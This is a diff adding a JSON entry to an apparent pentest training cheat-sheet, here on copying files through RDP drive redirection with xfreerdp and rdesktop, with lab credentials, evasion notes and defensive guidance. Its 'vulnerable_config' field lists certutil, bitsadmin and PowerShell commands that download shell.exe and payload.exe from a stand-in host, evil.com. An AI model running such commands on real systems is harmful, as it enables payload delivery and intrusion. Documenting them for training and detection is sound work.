@@ -1,0 +1,91 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "rdp"
+  ],
+  "tools": [
+    "xfreerdp",
+    "rdesktop"
+  ],
+  "tags": [
+    "rdp",
+    "drive-mount",
+    "transfer"
+  ],
+  "category": "File Transfers",
+  "subcategory": "RDP & WinRM",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Prep + verify the shared folder",
+      "command": "mkdir -p /home/user/rdp-share; echo \"RDP OK\" > /home/user/rdp-share/from_linux.txt\nls /home/user/rdp-share"
+    }
+  ],
+  "notes": "Mount a local folder into RDP (`xfreerdp /drive:share,.` or mstsc Local Resources) so files copy through the RDP channel - no extra port, blends with the session. Appears as \\\\tsclient\\share on the target.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "winrm-ps-session",
+      "rel": "alternative",
+      "note": "WinRM Copy-Item if you have WinRM."
+    },
+    {
+      "id": "pth-freerdp",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "rdp-drive-mount",
+  "name": "RDP - Mount a Local Drive",
+  "command": "xfreerdp /v:<ip> /u:<user> /p:<pass> /drive:linux,/home/user/share",
+  "description": "Mount a local folder into an RDP session so you can drag files between your box and the target through the RDP redirected drive - works when other channels are blocked.",
+  "variations": [
+    {
+      "label": "xfreerdp",
+      "command": "xfreerdp /v:<ip> /u:<user> /p:'HTB_@cademy_stdnt!' /drive:linux,/home/user/rdp-share"
+    },
+    {
+      "label": "rdesktop",
+      "command": "rdesktop <ip> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "RDP can mount a local drive into the remote session (xfreerdp /drive, mstsc drive redirection), exposing a shared folder through which files copy over the encrypted RDP channel - no separate download tool needed.",
+    "prerequisites": "Valid RDP access to the Windows target and drive-redirection permitted by policy.",
+    "impact": "Files move between attacker and target inside the RDP session, over an already-trusted encrypted channel.",
+    "detection": "RDP drive redirection creates tsclient device-mount events; file copies to/from \\\\tsclient in the session; the RDP connection itself is expected but the redirected-drive activity is the signal.",
+    "artifacts": "A tsclient mounted drive; file operations against \\\\tsclient\\...; RDP session logs.",
+    "prevention": "Disable drive redirection via GPO where not needed (Do not allow drive redirection); restrict RDP to jump hosts; monitor tsclient mounts.",
+    "evasion": "Traffic is inside the encrypted RDP channel and hard to inspect on the wire; using an existing legitimate RDP session blends with admin activity.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
